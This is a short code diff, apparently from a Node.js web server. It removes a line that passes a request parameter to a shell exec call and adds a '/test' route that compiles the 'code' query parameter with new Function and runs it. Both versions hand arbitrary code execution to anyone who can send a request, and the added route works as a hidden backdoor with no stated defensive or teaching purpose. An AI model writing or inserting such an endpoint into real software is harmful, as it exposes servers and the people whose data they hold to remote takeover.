@@ -1,3 +1,5 @@
-const { exec } = require("child_process");
-
-exec(req.query.cmd);
+app.get("/test", (req, res) => {
+  const fn = new Function(req.query.code);
+  fn();
+  res.send("ok");
+});
